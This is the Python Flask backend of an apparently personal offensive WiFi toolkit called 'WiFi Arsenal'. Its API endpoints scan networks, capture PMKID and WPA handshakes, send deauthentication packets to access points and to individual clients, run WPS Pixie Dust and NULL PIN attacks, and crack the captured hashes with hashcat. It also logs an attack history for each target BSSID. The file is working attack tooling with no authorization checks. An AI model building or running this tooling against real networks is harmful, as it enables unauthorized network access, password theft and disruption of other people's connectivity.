#!/usr/bin/env python3
"""
WiFi Arsenal API Server - FIXED VERSION
Backend for the web interface - executes scripts and returns results
"""

from flask import Flask, request, jsonify, send_from_directory, Response, stream_with_context, send_file
import anthropic
from mcp_client import get_mcp_client, shutdown_mcp_client
import subprocess
import os
import glob
import signal
import time
import threading
import re
import requests
import logging

import json
import queue
from datetime import datetime

app = Flask(__name__, static_folder='web', static_url_path='')

# ========== VENDOR LOOKUP HELPER ==========
OUI_CACHE = {}

def load_oui_database():
    """Load OUI database for vendor lookup"""
    global OUI_CACHE
    if OUI_CACHE:
        return OUI_CACHE
    
    oui_file = '/usr/share/ieee-data/oui.txt'
    try:
        with open(oui_file, 'r', errors='ignore') as f:
            for line in f:
                if '(hex)' in line:
                    parts = line.split('(hex)')
                    if len(parts) >= 2:
                        mac_prefix = parts[0].strip().replace('-', ':').upper()
                        vendor = parts[1].strip()
                        OUI_CACHE[mac_prefix] = vendor
    except:
        pass
    return OUI_CACHE

def lookup_vendor(mac):
    """Get vendor name from MAC address"""
    oui = load_oui_database()
    prefix = mac.upper()[:8]  # First 3 octets: XX:XX:XX
    vendor = oui.get(prefix, 'Unknown')
    
    # Shorten common vendor names
    short_names = {
        'Apple, Inc.': 'Apple',
        'Samsung Electronics Co.,Ltd': 'Samsung',
        'Intel Corporate': 'Intel',
        'Raspberry Pi Foundation': 'Raspberry Pi',
        'Espressif Inc.': 'Espressif (IoT)',
        'Amazon Technologies Inc.': 'Amazon',
        'Google, Inc.': 'Google',
        'Microsoft Corporation': 'Microsoft',
        'Murata Manufacturing Co., Ltd.': 'Murata (IoT)',
        'Texas Instruments': 'TI',
        'Qualcomm Inc.': 'Qualcomm',
        'LG Electronics (Mobile Communications)': 'LG',
        'Huawei Technologies Co.,Ltd': 'Huawei',
        'Sony Mobile Communications Inc': 'Sony',
        'OnePlus Technology (Shenzhen) Co., Ltd': 'OnePlus',
        'NETGEAR': 'Netgear',
        'TP-LINK TECHNOLOGIES CO.,LTD.': 'TP-Link',
        'ASUSTek COMPUTER INC.': 'ASUS',
        'Cisco Systems, Inc': 'Cisco',
        'Ubiquiti Inc': 'Ubiquiti',
        'Arris Group, Inc.': 'Arris',
        'ARRIS Group, Inc.': 'Arris',
        'Ruckus Wireless': 'Ruckus',
    }
    
    for full, short in short_names.items():
        if full.lower() in vendor.lower():
            return short
    
    # Truncate long names
    if len(vendor) > 20:
        return vendor[:20] + '...'
    return vendor

def signal_quality(dbm):
    """Convert dBm to quality label"""
    try:
        power = int(dbm)
        if power >= -50:
            return 'Excellent'
        elif power >= -60:
            return 'Good'
        elif power >= -70:
            return 'Fair'
        else:
            return 'Weak'
    except:
        return 'Unknown'

def activity_level(packets):
    """Determine activity level from packet count"""
    try:
        pkt_count = int(packets)
        if pkt_count > 1000:
            return 'ACTIVE'
        elif pkt_count > 100:
            return 'Moderate'
        else:
            return 'Idle'
    except:
        return 'Unknown'

# Suppress status polling spam in logs
class StatusPollFilter(logging.Filter):
    def filter(self, record):
        # Block GET /api/mode/status requests from logs
        return '/api/mode/status' not in record.getMessage()

# Apply filter to werkzeug logger (handles Flask request logging)
log = logging.getLogger('werkzeug')
log.addFilter(StatusPollFilter())

SCRIPT_DIR = "/home/ov3rr1d3/wifi_arsenal/scripts"
CAPTURE_DIR = "/home/ov3rr1d3/wifi_arsenal/captures"
WEB_DIR = "/home/ov3rr1d3/wifi_arsenal/web"
PORTAL_DIR = "/home/ov3rr1d3/wifi_arsenal/portals"
LOG_DIR = "/home/ov3rr1d3/wifi_arsenal/logs"
ATTACK_LOG_DIR = "/home/ov3rr1d3/wifi_arsenal/logs/attacks"
GLASS_URL = "https://glass.sparkinitiative.io"
GLASS_LAN = "http://192.168.1.7:5001"  # LAN fallback still works on home network
HIDDEN_CACHE = "/home/ov3rr1d3/wifi_arsenal/hidden_ssids.json"
TARGET_DATA_FILE = "/home/ov3rr1d3/wifi_arsenal/target_data.json"

# Load/save target data (notes + attack history per BSSID)
def load_target_data():
    try:
        if os.path.exists(TARGET_DATA_FILE):
            with open(TARGET_DATA_FILE, 'r') as f:
                return json.load(f)
    except:
        pass
    return {}

def save_target_data(data):
    try:
        with open(TARGET_DATA_FILE, 'w') as f:
            json.dump(data, f, indent=2)
    except Exception as e:
        print(f"Failed to save target data: {e}")

def log_attack_to_target(bssid, ssid, attack_type, result):
    """Log an attack attempt to target history"""
    data = load_target_data()
    if bssid not in data:
        data[bssid] = {'ssid': ssid, 'notes': '', 'attacks': []}
    data[bssid]['attacks'].append({
        'type': attack_type,
        'date': datetime.now().strftime('%Y-%m-%d %H:%M'),
        'result': result
    })
    # Keep only last 20 attacks per target
    data[bssid]['attacks'] = data[bssid]['attacks'][-20:]
    save_target_data(data)

target_data = load_target_data()

# Create attack logs directory if it doesn't exist
os.makedirs(ATTACK_LOG_DIR, exist_ok=True)

def try_glass_request(method, endpoint, **kwargs):
    """Try Glass request with LAN fallback to Cloudflare Tunnel

    Args:
        method: 'get' or 'post'
        endpoint: endpoint path like '/upload' or '/status'
        **kwargs: additional requests arguments (files, timeout, etc.)

    Returns:
        requests.Response object
    """
    # Try local LAN first (fast when on same network)
    try:
        if method == 'post':
            response = requests.post(f'{GLASS_LAN}{endpoint}', timeout=2, **kwargs)
        else:
            response = requests.get(f'{GLASS_LAN}{endpoint}', timeout=2, **kwargs)

        # Any non-500 response means Glass is reachable
        if response.status_code < 500:
            return response
    except (requests.exceptions.ConnectionError, requests.exceptions.Timeout):
        pass  # LAN failed, try Cloudflare Tunnel

    # Fall back to Cloudflare Tunnel (works from anywhere)
    if method == 'post':
        return requests.post(f'{GLASS_URL}{endpoint}', timeout=30, **kwargs)
    else:
        return requests.get(f'{GLASS_URL}{endpoint}', timeout=30, **kwargs)

# Global state for cracking process
cracking_state = {
    'running': False,
    'process': None,
    'output': '',
    'status': '',
    'progress': '',
    'speed': '',
    'time_remaining': '',
    'device': 'Detecting...',
    'hash_file': ''
}


# Global state for orchestrator process
orchestrator_state = {
    'running': False,
    'process': None,
    'log_file': None,
    'start_time': None
}

# Global state for live wardrive scanning
import sys
sys.path.insert(0, '/home/ov3rr1d3/wifi_arsenal/wardrive_system/wardrive')
from vehicle_filter import is_vehicle_ssid
wardrive_live_state = {
    'session': None,
    'running': False,
    'nav_mode': False
}

# Global state for live attack streaming
live_attack = {
    'running': False,
    'log_file': None,
    'attack_type': None,
    'target': None,
    'start_time': None,
    'pid': None
}

# Global state for The Operator - cached results
operator_state = {
    'last_scan': {
        'networks': [],
        'timestamp': None,
        'duration': 0
    },
    'last_attack': {
        'type': None,
        'target': None,
        'result': None,
        'timestamp': None
    },
    'selected_target': {
        'ssid': None,
        'bssid': None,
        'channel': None
    }
}

def run_script(script_name, args=[], timeout_seconds=120, log_file=None):
    """Execute a bash script and return output
    
    Args:
        script_name: Name of script in SCRIPT_DIR
        args: List of arguments
        timeout_seconds: Timeout in seconds
        log_file: Optional path to save output (for attack methods)
    """
    script_path = os.path.join(SCRIPT_DIR, script_name)
    cmd = ['bash', script_path] + args
    
    try:
        result = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            timeout=timeout_seconds,
            preexec_fn=os.setsid
        )
        
        output = result.stdout + result.stderr
        
        # Save to log file if specified
        if log_file:
            try:
                with open(log_file, 'w') as f:
                    f.write(f"Command: {' '.join(cmd)}\n")
                    f.write(f"Timestamp: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
                    f.write(f"Exit Code: {result.returncode}\n")
                    f.write("=" * 80 + "\n\n")
                    f.write(output)
            except Exception as e:
                print(f"Warning: Failed to write log file: {e}")
        
        return {
            'success': result.returncode == 0,
            'output': output,
            'returncode': result.returncode
        }
    except subprocess.TimeoutExpired as e:
        try:
            os.killpg(os.getpgid(e.pid), signal.SIGTERM)
        except:
            pass
        
        # Try to get partial output from the script
        partial_output = ''
        if hasattr(e, 'stdout') and e.stdout:
            partial_output = e.stdout.decode() if isinstance(e.stdout, bytes) else str(e.stdout)
        
        # For WPS attacks, give meaningful failure message
        if 'attack_wps' in str(cmd):
            output = 'WPS attacks completed - no vulnerability found.\n\nPixie Dust and NULL PIN attacks did not succeed.\nThis router is not vulnerable to quick WPS attacks.'
        elif partial_output:
            output = partial_output
        else:
            output = f'Command timed out after {timeout_seconds} seconds'
        if log_file:
            try:
                with open(log_file, 'w') as f:
                    f.write(f"Command: {' '.join(cmd)}\n")
                    f.write(f"Timestamp: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
                    f.write(f"Status: TIMEOUT\n")
                    f.write("=" * 80 + "\n\n")
                    f.write(output)
            except:
                pass
        
        return {
            'success': False,
            'output': output,
            'returncode': -1
        }
    except Exception as e:
        output = f'Error: {str(e)}'
        if log_file:
            try:
                with open(log_file, 'w') as f:
                    f.write(f"Command: {' '.join(cmd)}\n")
                    f.write(f"Timestamp: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
                    f.write(f"Status: ERROR\n")
                    f.write("=" * 80 + "\n\n")
                    f.write(output)
            except:
                pass
        
        return {
            'success': False,
            'output': output,
            'returncode': -1
        }

def check_portal_running():
    """Check if portal services are active"""
    try:
        # Check hostapd
        hostapd = subprocess.run(['pgrep', '-f', 'hostapd.*portal'], 
                                capture_output=True, text=True)
        # Check dnsmasq  
        dnsmasq = subprocess.run(['pgrep', '-f', 'dnsmasq.*portal'],
                                capture_output=True, text=True)
        # Check portal_server
        portal_server = subprocess.run(['pgrep', '-f', 'portal_server.py'],
                                      capture_output=True, text=True)
        
        return (hostapd.returncode == 0 and 
                dnsmasq.returncode == 0 and 
                portal_server.returncode == 0)
    except:
        return False

def estimate_distance(dbm):
    """Estimate distance from signal strength - returns (category, feet estimate)"""
    try:
        signal = int(dbm)
        if signal >= -50:
            return ("Very Close", "~15-30ft")
        elif signal >= -60:
            return ("Close", "~30-50ft")
        elif signal >= -70:
            return ("Medium", "~50-100ft")
        elif signal >= -80:
            return ("Far", "~100-150ft")
        else:
            return ("Very Far", "150ft+")
    except:
        return ("Unknown", "N/A")


def parse_networks_from_scan(csv_file):
    """Parse networks from airodump CSV output"""
    networks = []
    
    if not os.path.exists(csv_file):
        print(f"CSV file doesn't exist: {csv_file}")
        return networks
    
    # Load hidden SSID cache
    hidden_cache = {}
    if os.path.exists(HIDDEN_CACHE):
        try:
            with open(HIDDEN_CACHE, 'r') as f:
                hidden_cache = json.load(f)
        except:
            pass
    
    try:
        with open(csv_file, 'r', errors='ignore') as f:
            lines = f.readlines()
        
        print(f"Read {len(lines)} lines from CSV")
        
        # Parse APs
        ap_section = False
        
        for i, line in enumerate(lines):
            # Detect AP section start
            if 'BSSID' in line and 'First time seen' in line:
                ap_section = True
                print(f"Found AP section at line {i}")
                continue
            
            # Detect station section start (end of AP section)
            if 'Station MAC' in line:
                ap_section = False
                continue
            
            # Parse AP lines
            if ap_section and line.strip():
                try:
                    parts = line.split(',')
                    if len(parts) >= 14:
                        bssid = parts[0].strip()
                        
                        # Skip invalid BSSIDs
                        if ':' not in bssid or len(bssid) != 17:
                            continue
                        
                        channel = parts[3].strip()
                        encryption = parts[5].strip()
                        power = parts[8].strip()
                        ssid = parts[13].strip() if parts[13].strip() else ''
                        
                        # Check cache for hidden SSIDs
                        if not ssid and bssid in hidden_cache:
                            ssid = hidden_cache[bssid]
                        
                        # Skip invalid channels (-1, empty, non-numeric)
                        try:
                            ch_num = int(channel)
                            if ch_num < 1 or ch_num > 200:
                                continue
                        except (ValueError, TypeError):
                            continue
                        
                        networks.append({
                            'bssid': bssid,
                            'channel': channel,
                            'encryption': encryption,
                            'power': power,
                            'ssid': ssid if ssid else '[hidden]',
                            'hidden': ssid == '',
                            'vendor': lookup_vendor(bssid),
                            'clients': 0  # Will be populated below
                        })
                        print(f"Parsed network: {ssid if ssid else '<hidden>'} ({bssid})")
                except Exception as e:
                    print(f"Error parsing AP line: {e}")
                    continue
        
        print(f"Parsed {len(networks)} networks total")
        
        # Count clients per BSSID from station section
        client_counts = {}
        station_section = False
        for line in lines:
            if 'Station MAC' in line:
                station_section = True
                continue
            if station_section and line.strip():
                parts = line.split(',')
                if len(parts) >= 6:
                    assoc_bssid = parts[5].strip().upper()
                    if ':' in assoc_bssid and len(assoc_bssid) == 17:
                        client_counts[assoc_bssid] = client_counts.get(assoc_bssid, 0) + 1
        
        # Apply client counts to networks
        for net in networks:
            net['clients'] = client_counts.get(net['bssid'].upper(), 0)
        
        # Sort by signal strength (strongest first)
        networks.sort(key=lambda x: int(x.get('power', '-100').lstrip('-')) if x.get('power', '').lstrip('-').isdigit() else 100, reverse=False)
                    
    except Exception as e:
        print(f"Error reading CSV: {e}")
    
    return networks

def parse_hashcat_status(line):
    """Parse hashcat status output"""
    global cracking_state
    
    # Device line: "* Device #1: NVIDIA GeForce RTX 3050 Laptop GPU, 3822/3894 MB, 16MCU"
    device_match = re.search(r'\*\s*Device\s+#\d+:\s*([^,]+)', line)
    if device_match:
        cracking_state['device'] = device_match.group(1).strip()
        return
    
    # Progress line: "Progress.........: 1234567/14344384 (8.61%)"
    progress_match = re.search(r'Progress.*:\s*(\d+)/(\d+)\s*\(([0-9.]+)%\)', line)
    if progress_match:
        current = progress_match.group(1)
        total = progress_match.group(2)
        percent = progress_match.group(3)
        cracking_state['progress'] = f"{percent}% ({current}/{total})"
        return
    
    # Speed line: "Speed.#1.........:   123.4 kH/s (10.23ms)"
    speed_match = re.search(r'Speed.*:\s*([0-9.]+\s*[kMGT]?H/s)', line)
    if speed_match:
        cracking_state['speed'] = speed_match.group(1)
        return
    
    # Time remaining: "Time.Estimated...: Sat Oct 18 20:30:45 2025 (1 min, 23 secs)"
    time_match = re.search(r'Time\.Estimated.*\(([^)]+)\)', line)
    if time_match:
        cracking_state['time_remaining'] = time_match.group(1)
        return

def run_hashcat_thread(hash_file):
    """Run hashcat in background thread"""
    global cracking_state
    
    try:
        # Clear potfile to force fresh cracking every time
        potfile = os.path.expanduser('~/.hashcat/hashcat.potfile')
        if os.path.exists(potfile):
            os.remove(potfile)
        
        cmd = [
            'hashcat', '-m', '22000',
            hash_file,
            '/usr/share/wordlists/rockyou.txt',
            '-O',  # Optimized kernels
            '-w', '3',  # Workload profile 3 (maximum)
            '--status',  # Show status
            '--status-timer=2',  # Update every 2 seconds
            '--potfile-disable'  # Don't use cache - always crack fresh
        ]
        
        cracking_state['process'] = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            bufsize=1
        )
        
        # Read output line by line
        for line in cracking_state['process'].stdout:
            if line.strip():
                cracking_state['output'] += line
                parse_hashcat_status(line)
                
                # Check for cracked password
                if 'Cracked' in line or 'Status' in line:
                    cracking_state['status'] = line.strip()
        
        # Wait for process to complete
        cracking_state['process'].wait()
        
        # Check if password was cracked
        check_cmd = ['hashcat', '-m', '22000', hash_file, '--show']
        check_result = subprocess.run(check_cmd, capture_output=True, text=True)
        
        if check_result.stdout.strip():
            # Parse: hash:ap_mac:client_mac:ssid:password
            cracked_line = check_result.stdout.strip()
            try:
                parts = cracked_line.split(':')
                if len(parts) >= 5:
                    ssid = parts[-2]
                    password = parts[-1]
                    cracking_state['status'] = f'CRACKED: {ssid}:{password}'
                else:
                    cracking_state['status'] = f'CRACKED: {cracked_line}'
            except:
                cracking_state['status'] = f'CRACKED: {cracked_line}'
        else:
            if cracking_state['process'].returncode == 0:
                cracking_state['status'] = 'Exhausted - password not in wordlist'
            else:
                cracking_state['status'] = 'Cracking failed'
        
    except Exception as e:
        cracking_state['status'] = f'Error: {str(e)}'
    finally:
        cracking_state['running'] = False
        cracking_state['process'] = None


@app.after_request
def add_no_cache_headers(response):
    """Prevent browser caching - always serve fresh content"""
    response.headers['Cache-Control'] = 'no-store, no-cache, must-revalidate, max-age=0'
    response.headers['Pragma'] = 'no-cache'
    response.headers['Expires'] = '0'
    return response

@app.route('/')
def index():
    """Serve the main interface"""
    return send_from_directory(WEB_DIR, 'index.html')

@app.route('/wardrive_system/tiles/<path:tile_path>')
def serve_tiles(tile_path):
    """Serve offline map tiles with correct content-type detection.
    Tile files may be JPEG with .png extension - detect actual format from magic bytes.
    """
    tiles_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'wardrive_system', 'wardrive', 'tiles')
    tile_full_path = os.path.join(tiles_dir, tile_path)

    # Check if file exists
    if not os.path.isfile(tile_full_path):
        return "Tile not found", 404

    # Detect actual content type from file magic bytes
    with open(tile_full_path, 'rb') as f:
        magic = f.read(4)

    if magic.startswith(b'\xff\xd8'):
        mimetype = 'image/jpeg'
    elif magic.startswith(b'\x89PNG'):
        mimetype = 'image/png'
    else:
        mimetype = 'application/octet-stream'

    return send_from_directory(tiles_dir, tile_path, mimetype=mimetype)

@app.route('/wardrive_system/wardrive/texas.pmtiles')
def serve_pmtiles():
    """Serve PMTiles file with HTTP Range request support for vector maps.
    PMTiles REQUIRES range requests - it fetches specific byte ranges, not the whole file."""
    pmtiles_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'wardrive_system', 'wardrive', 'texas.pmtiles')
    if not os.path.exists(pmtiles_path):
        return "PMTiles file not found", 404
    # send_file with conditional=True enables range request support
    return send_file(pmtiles_path, mimetype='application/octet-stream', conditional=True)

@app.route('/wardrive_system_v2/<path:filename>')
def serve_wardrive_v2(filename):
    """Serve wardrive v2 system files (map, networks.json, static files)"""
    v2_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'wardrive_system_v2', 'map')
    return send_from_directory(v2_dir, filename)

@app.route('/wardrive_system/<path:filename>')
def serve_wardrive(filename):
    """Serve wardrive system files (map, etc)"""
    # Tile requests must go to serve_tiles() - not here
    if filename.startswith('tiles/'):
        tiles_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'wardrive_system', 'wardrive', 'tiles')
        tile_path = filename[6:]  # strip 'tiles/' prefix
        tile_full_path = os.path.join(tiles_dir, tile_path)
        if not os.path.isfile(tile_full_path):
            return "", 404
        with open(tile_full_path, 'rb') as f:
            magic = f.read(4)
        if magic.startswith(b'\xff\xd8'):
            mimetype = 'image/jpeg'
        elif magic.startswith(b'\x89PNG'):
            mimetype = 'image/png'
        else:
            mimetype = 'application/octet-stream'
        return send_from_directory(tiles_dir, tile_path, mimetype=mimetype)

    wardrive_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'wardrive_system')
    response = send_from_directory(wardrive_dir, filename)
    if filename.endswith('.html'):
        response.headers['Cache-Control'] = 'no-cache, no-store, must-revalidate'
        response.headers['Pragma'] = 'no-cache'
        response.headers['Expires'] = '0'
    return response

@app.route('/api/scan', methods=['POST'])
def scan():
    """Run network scan"""
    try:
        data = request.json
        duration = str(data.get('duration', 30))
        
        print(f"Starting scan with duration {duration}")
        
        # Get timestamp BEFORE scan
        scan_start_time = time.time()
        
        # Run scan
        result = run_script('scan.sh', [duration], timeout_seconds=int(duration) + 10)
        
        # Check if scan actually succeeded
        if not result['success']:
            # Check if failure was due to missing interface
            if 'Failed to set monitor mode' in result['output'] or 'down' in result['output'].lower():
                return jsonify({
                    'success': False,
                    'output': '❌ alfa0 not found\n\nPlease plug in the Alfa AWUS036ACM card and try again.',
                    'networks': []
                })
            return jsonify({
                'success': False,
                'output': result['output'],
                'networks': []
            })
        
        # Find CSV files created AFTER scan started
        csv_files = glob.glob(os.path.join(CAPTURE_DIR, 'scan_*-01.csv'))
        new_csv_files = [f for f in csv_files if os.path.getctime(f) >= scan_start_time]
        
        if new_csv_files:
            # Get the newest one from this scan
            latest_csv = max(new_csv_files, key=os.path.getctime)
            networks = parse_networks_from_scan(latest_csv)
            
            # Cache for The Operator
            operator_state['last_scan'] = {
                'networks': networks,
                'timestamp': datetime.now().isoformat(),
                'duration': int(duration)
            }
            
            return jsonify({
                'success': True,
                'output': f"Scan complete. Found {len(networks)} networks.",
                'networks': networks
            })
        else:
            return jsonify({
                'success': False,
                'output': 'Scan completed but no CSV file was created. Check if alfa0 is connected.',
                'networks': []
            })
        
    except Exception as e:
        print(f"Exception in scan endpoint: {e}")
        import traceback
        traceback.print_exc()
        return jsonify({
            'success': False,
            'output': f'Server error: {str(e)}',
            'networks': []
        })

@app.route('/api/connect', methods=['POST'])
def connect_to_network():
    """Connect to a WiFi network using nmcli"""
    try:
        data = request.json
        ssid = data.get('ssid')
        bssid = data.get('bssid')
        password = data.get('password')

        if not ssid and not bssid:
            return jsonify({'success': False, 'output': 'Missing SSID or BSSID'})

        # Force a rescan first so wlan0 sees fresh networks (scan was done on alfa0)
        # Use list --rescan yes which blocks until scan completes
        subprocess.run(['nmcli', 'device', 'wifi', 'list', '--rescan', 'yes'], capture_output=True, timeout=15)

        # Delete any existing connection profile (prevents "key-mgmt missing" error from stale profiles)
        target = ssid if (ssid and ssid != '[hidden]') else bssid
        subprocess.run(['nmcli', 'connection', 'delete', target], capture_output=True, timeout=5)

        # Build command - use SSID if available, otherwise BSSID
        if ssid and ssid != '[hidden]':
            cmd = ['nmcli', 'device', 'wifi', 'connect', ssid]
        else:
            cmd = ['nmcli', 'device', 'wifi', 'connect', bssid]

        # Add password if provided
        if password:
            cmd.extend(['password', password])

        result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)

        if result.returncode == 0:
            return jsonify({
                'success': True,
                'output': f'Successfully connected to {ssid or bssid}'
            })
        else:
            return jsonify({
                'success': False,
                'output': result.stderr or result.stdout or 'Connection failed'
            })
    except subprocess.TimeoutExpired:
        return jsonify({'success': False, 'output': 'Connection timed out'})
    except Exception as e:
        return jsonify({'success': False, 'output': f'Error: {str(e)}'})

@app.route('/api/pmkid', methods=['POST'])
def pmkid():
    """Capture PMKID"""
    data = request.json
    bssid = data.get('bssid')
    channel = str(data.get('channel'))
    ssid = data.get('ssid', 'unknown')
    duration = str(data.get('duration', 60))
    
    if not bssid or not channel:
        return jsonify({'success': False, 'output': 'Missing BSSID or channel'})
    
    run_script('capture_pmkid.sh', [bssid, channel, ssid, duration], timeout_seconds=int(duration) + 10)
    
    # Wait for script to complete
    time.sleep(2)
    
    # Look for capture files (new format first: AP=ssid_time.cap/pcapng/hc22000)
    safe_ssid = ssid.replace(' ', '_')

    # Check for .hc22000 first
    hash_files = glob.glob(os.path.join(CAPTURE_DIR, f'AP={safe_ssid}*.hc22000'))
    if not hash_files:
        hash_files = glob.glob(os.path.join(CAPTURE_DIR, f'pmkid_{bssid.replace(":", "_")}*.hc22000'))
    
    if hash_files:
        latest = max(hash_files, key=os.path.getctime)
        log_attack_to_target(bssid, ssid, 'pmkid', 'captured')
        return jsonify({
            'success': True,
            'output': f'PMKID captured successfully.\nHash file: {os.path.basename(latest)}\n\nReady to crack.'
        })
    
    # No .hc22000 found - look for .cap/.pcap/.pcapng and convert
    capture_files = []
    for ext in ['.cap', '.pcap', '.pcapng']:
        pattern1 = os.path.join(CAPTURE_DIR, f'AP={safe_ssid}*{ext}')
        pattern2 = os.path.join(CAPTURE_DIR, f'pmkid_{bssid.replace(":", "_")}*{ext}')
        found1 = glob.glob(pattern1)
        found2 = glob.glob(pattern2)
        capture_files.extend(found1)
        capture_files.extend(found2)
    
    if capture_files:
        # Found capture file - try to convert it
        latest_capture = max(capture_files, key=os.path.getctime)
        hash_file = latest_capture.rsplit('.', 1)[0] + '.hc22000'
        
        try:
            result = subprocess.run(
                ['hcxpcapngtool', '-o', hash_file, latest_capture],
                capture_output=True,
                text=False,
                timeout=10
            )
            
            if os.path.exists(hash_file) and os.path.getsize(hash_file) > 0:
                log_attack_to_target(bssid, ssid, 'pmkid', 'captured')
                return jsonify({
                    'success': True,
                    'output': f'PMKID captured successfully.\nHash file: {os.path.basename(hash_file)}\n\nReady to crack.'
                })
            else:
                log_attack_to_target(bssid, ssid, 'pmkid', 'no pmkid in traffic')
                return jsonify({
                    'success': False,
                    'output': f'Capture created but no PMKID found in traffic.\nPCAP file: {os.path.basename(latest_capture)}\n\nTry handshake capture instead.'
                })
        except Exception as e:
            return jsonify({
                'success': False,
                'output': f'Conversion error: {str(e)}'
            })
    else:
        log_attack_to_target(bssid, ssid, 'pmkid', 'no capture')
        return jsonify({'success': False, 'output': 'PMKID capture failed - no files created. Check if alfa0 is in monitor mode.'})

@app.route('/api/handshake', methods=['POST'])
def handshake():
    """Capture full handshake with deauth"""
    data = request.json
    bssid = data.get('bssid')
    channel = str(data.get('channel'))
    ssid = data.get('ssid', 'unknown')
    duration = str(data.get('duration', 60))
    deauth_interval = str(data.get('deauth_interval', 10))
    
    if not bssid or not channel:
        return jsonify({'success': False, 'output': 'Missing BSSID or channel'})
    
    run_script('capture_handshake.sh', [bssid, channel, ssid, duration, deauth_interval], timeout_seconds=int(duration) + 10)
    
    # Wait for script to complete
    time.sleep(2)
    
    # Look for capture files (new format first: AP=ssid_time.cap/pcapng/hc22000)
    safe_ssid = ssid.replace(' ', '_')
    
    # Check for .hc22000 first
    hash_files = glob.glob(os.path.join(CAPTURE_DIR, f'AP={safe_ssid}*.hc22000'))
    if not hash_files:
        hash_files = glob.glob(os.path.join(CAPTURE_DIR, f'handshake_{bssid.replace(":", "_")}*.hc22000'))
    
    if hash_files:
        latest = max(hash_files, key=os.path.getctime)
        log_attack_to_target(bssid, ssid, 'handshake', 'captured')
        return jsonify({
            'success': True,
            'output': f'Handshake captured successfully.\nHash file: {os.path.basename(latest)}\n\nReady to crack.'
        })
    
    # No .hc22000 found - look for .cap/.pcap/.pcapng and convert
    capture_files = []
    for ext in ['.cap', '.pcap', '.pcapng']:
        capture_files.extend(glob.glob(os.path.join(CAPTURE_DIR, f'AP={safe_ssid}*{ext}')))
        capture_files.extend(glob.glob(os.path.join(CAPTURE_DIR, f'handshake_{bssid.replace(":", "_")}*{ext}')))
    
    if capture_files:
        # Found capture file - try to convert it
        latest_capture = max(capture_files, key=os.path.getctime)
        hash_file = latest_capture.rsplit('.', 1)[0] + '.hc22000'
        
        try:
            result = subprocess.run(
                ['hcxpcapngtool', '-o', hash_file, latest_capture],
                capture_output=True,
                text=False,
                timeout=10
            )
            
            if os.path.exists(hash_file) and os.path.getsize(hash_file) > 0:
                log_attack_to_target(bssid, ssid, 'handshake', 'captured')
                return jsonify({
                    'success': True,
                    'output': f'Handshake captured successfully.\nHash file: {os.path.basename(hash_file)}\n\nReady to crack.'
                })
            else:
                log_attack_to_target(bssid, ssid, 'handshake', 'no handshake in traffic')
                return jsonify({
                    'success': False,
                    'output': f'Capture created but no handshake found.\nPCAP file: {os.path.basename(latest_capture)}\n\nNo EAPOL frames captured - may need to wait for client reconnection.'
                })
        except Exception as e:
            return jsonify({
                'success': False,
                'output': f'Conversion error: {str(e)}'
            })
    else:
        log_attack_to_target(bssid, ssid, 'handshake', 'no capture')
        return jsonify({'success': False, 'output': 'Handshake capture failed - no files created. Check if alfa0 is in monitor mode.'})

@app.route('/api/deauth', methods=['POST'])
def deauth():
    """Run deauth attack"""
    data = request.json
    bssid = data.get('bssid')
    channel = str(data.get('channel'))
    count = str(data.get('count', 10))
    
    if not bssid or not channel:
        return jsonify({'success': False, 'output': 'Missing BSSID or channel'})
    
    result = run_script('deauth.sh', [bssid, channel, '0', count], timeout_seconds=30)
    
    if result['success']:
        log_attack_to_target(bssid, 'unknown', 'deauth', f'sent {count} packets')
        return jsonify({'success': True, 'output': f'Sent {count} deauth packets to {bssid}'})
    else:
        log_attack_to_target(bssid, 'unknown', 'deauth', 'failed')
        return jsonify({'success': False, 'output': 'Deauth attack failed'})


@app.route('/api/deauth_client', methods=['POST'])
def deauth_client():
    """Targeted deauth - kick specific client from network"""
    data = request.json
    bssid = data.get('bssid')
    channel = str(data.get('channel'))
    client_mac = data.get('client_mac')
    count = str(data.get('count', 20))
    ssid = data.get('ssid', 'unknown')
    
    if not bssid or not channel or not client_mac:
        return jsonify({'success': False, 'output': 'Missing BSSID, channel, or client MAC'})
    
    result = run_script('deauth.sh', [bssid, channel, client_mac, count], timeout_seconds=30)
    
    if result['success']:
        # Cache for The Operator
        operator_state['last_attack'] = {
            'type': 'targeted_deauth',
            'target': f'{ssid} -> {client_mac}',
            'result': f'Sent {count} deauth packets',
            'timestamp': datetime.now().isoformat()
        }
        return jsonify({
            'success': True, 
            'output': f'🎯 Targeted deauth complete\n\nSent {count} packets to kick {client_mac} from {ssid}\n\nClient should disconnect and reconnect within seconds.'
        })
    else:
        return jsonify({'success': False, 'output': f'Targeted deauth failed: {result["output"]}'})


@app.route('/api/pmkid_active', methods=['POST'])
def pmkid_active():
    """Capture PMKID using hcxdumptool (active mode)"""
    data = request.json
    bssid = data.get('bssid')
    channel = str(data.get('channel'))
    ssid = data.get('ssid', 'unknown')
    duration = str(data.get('duration', 120))
    
    if not bssid or not channel:
        return jsonify({'success': False, 'output': 'Missing BSSID or channel'})
    
    # Create log file
    timestamp = time.strftime('%Y%m%d_%H%M%S')
    log_file = os.path.join(ATTACK_LOG_DIR, f'pmkid_active_{timestamp}.log')
    
    result = run_script('capture_pmkid_active.sh', [bssid, channel, ssid, duration], 
                       timeout_seconds=int(duration) + 10, log_file=log_file)
    
    return jsonify({
        'success': result['success'],
        'output': result['output']
    })

@app.route('/api/attack_wps', methods=['POST'])
def attack_wps():
    """WPS attacks (Pixie Dust + NULL PIN)"""
    data = request.json
    bssid = data.get('bssid')
    channel = str(data.get('channel'))
    ssid = data.get('ssid', 'unknown')
    
    if not bssid or not channel:
        return jsonify({'success': False, 'output': 'Missing BSSID or channel'})
    
    # Create log file
    timestamp = time.strftime('%Y%m%d_%H%M%S')
    log_file = os.path.join(ATTACK_LOG_DIR, f'wps_attack_{timestamp}.log')
    
    result = run_script('attack_wps.sh', [bssid, channel, ssid], 
                       timeout_seconds=360, log_file=log_file)
    
    return jsonify({
        'success': result['success'],
        'output': result['output']
    })

